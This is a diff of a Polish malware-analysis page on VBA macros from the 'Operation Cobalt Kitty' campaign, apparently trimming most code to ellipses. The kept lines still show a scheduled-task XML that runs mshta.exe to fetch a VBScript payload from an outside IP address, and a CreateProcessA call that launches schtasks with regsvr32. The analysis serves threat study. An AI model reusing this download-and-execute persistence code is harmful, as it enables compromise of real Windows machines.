@@ -354,52 +354,8 @@ End Sub
 
    ```vb
    Option Explicit
-
-   ' Deklaracja funkcji CreateProcessA z WinAPI
-   Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
-       ByVal lpApplicationName As String, _
-       ByVal lpCommandLine As String, _
-       ByVal lpProcessAttributes As LongPtr, _
-       ByVal lpThreadAttributes As LongPtr, _
-       ByVal bInheritHandles As Long, _
-       ByVal dwCreationFlags As Long, _
-       ByVal lpEnvironment As LongPtr, _
-       ByVal lpCurrentDirectory As String, _
-       lpStartupInfo As STARTUPINFO, _
-       lpProcessInformation As PROCESS_INFORMATION) As Long
-
-   ' Struktura STARTUPINFO
-   Private Type STARTUPINFO
-       cb As Long
-       lpReserved As LongPtr
-       lpDesktop As LongPtr
-       lpTitle As LongPtr
-       dwX As Long
-       dwY As Long
-       dwXSize As Long
-       dwYSize As Long
-       dwXCountChars As Long
-       dwYCountChars As Long
-       dwFillAttribute As Long
-       dwFlags As Long
-       wShowWindow As Integer
-       cbReserved2 As Integer
-       lpReserved2 As LongPtr
-       hStdInput As LongPtr
-       hStdOutput As LongPtr
-       hStdError As LongPtr
-   End Type
-
-   ' Struktura PROCESS_INFORMATION
-   Private Type PROCESS_INFORMATION
-       hProcess As LongPtr
-       hThread As LongPtr
-       dwProcessId As Long
-       dwThreadId As Long
-   End Type
-
-   ' Funkcja do usunięcia uchwytu procesu
-   Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
+    
+   …
 
    Sub CreateScheduledTaskWithCreateProcessA()
        Dim sCMDLine As String
@@ -415,20 +371,12 @@ End Sub
        
        ' Uruchomienie polecenia za pomocą CreateProcessA
        lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, NORMAL_PRIORITY_CLASS, 0, vbNullString, si, pi)
-       
-       ' Sprawdzenie czy zadanie zostało utworzone pomyślnie
-       If lSuccess = 0 Then
-           MsgBox "Nie udało się utworzyć zadania", vbCritical
-       Else
-           MsgBox "Zadanie zostało utworzone pomyślnie", vbInformation
-       End If
 
-       ' Zamknięcie uchwytów procesu i wątku
-       If pi.hProcess <> 0 Then CloseHandle pi.hProcess
-       If pi.hThread <> 0 Then CloseHandle pi.hThread
+   …
+   
    End Sub
    ```
-
+    [Rozszerzona analiza kodów makr użytych w Operacji Cobalt Kitty](operacja-cobalt-kitty.md#rozszerzona-analiza-kodów-makr-użytych-w-operacji-cobalt-kitty)
    **Opis Przykładu:**
 
    - **Funkcja `CreateProcessA`:** Używana do tworzenia nowego procesu, w tym przypadku `schtasks`, który tworzy harmonogramowane zadanie uruchamiające `regsvr32.exe` z określonymi parametrami.
@@ -444,48 +392,19 @@ End Sub
        Dim tstr As String
        Dim XMLStr As String
        
-       ' Budowanie XML-a dla zadania
-       tstr = "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf
-       tstr = tstr & "  <Triggers>" & vbCrLf
-       tstr = tstr & "    <TimeTrigger>" & vbCrLf
-       tstr = tstr & "      <Repetition>" & vbCrLf
-       tstr = tstr & "        <Interval>PT15M</Interval>" & vbCrLf
-       tstr = tstr & "      </Repetition>" & vbCrLf
-       tstr = tstr & "      <StartBoundary>2024-01-01T00:00:00</StartBoundary>" & vbCrLf
-       tstr = tstr & "    </TimeTrigger>" & vbCrLf
-       tstr = tstr & "  </Triggers>" & vbCrLf
-       tstr = tstr & "  <Actions Context=""Author"">" & vbCrLf
-       tstr = tstr & "    <Exec>" & vbCrLf
+       … 
+   
        tstr = tstr & "      <Command>mshta.exe</Command>" & vbCrLf
        tstr = tstr & "      <Arguments>about:""<script language=""vbscript"">" & vbCrLf
        tstr = tstr & "      src=""http://110.10.179.65:80/download/microsoftfp.jpg"";code close</script>""</Arguments>" & vbCrLf
-       tstr = tstr & "    </Exec>" & vbCrLf
-       tstr = tstr & "  </Actions>" & vbCrLf
-       tstr = tstr & "</Task>"
 
-       ' Zapisz XML jako plik tymczasowy
-       Dim fso As Object
-       Dim tempFile As String
-       Set fso = CreateObject("Scripting.FileSystemObject")
-       tempFile = Environ("TEMP") & "\ScheduledTask.xml"
-       Dim file As Object
-       Set file = fso.CreateTextFile(tempFile, True)
-       file.WriteLine tstr
-       file.Close
-
-       ' Wykonaj polecenie schtasks z wykorzystaniem pliku XML
-       Dim sCmd As String
-       sCmd = "schtasks /create /tn ""Power Efficiency Diagnostics XML"" /xml """ & tempFile & """ /f"
-       Shell sCmd, vbNormalFocus
-
-       ' Usuń plik XML po utworzeniu zadania
-       fso.DeleteFile tempFile, True
-
-       MsgBox "Zadanie zostało utworzone pomyślnie przy użyciu XML", vbInformation
+   …
+   
    End Sub
    ```
-
-   **Opis Przykładu:**
+   [Rozszerzona analiza kodów makr użytych w Operacji Cobalt Kitty](operacja-cobalt-kitty.md#rozszerzona-analiza-kodów-makr-użytych-w-operacji-cobalt-kitty)
+   
+3. **Opis Przykładu:**
 
    - **Tworzenie XML:** Skrypt buduje plik XML definiujący harmonogramowane zadanie, które co 15 minut uruchamia `mshta.exe` z wbudowanym skryptem VBScript.
    
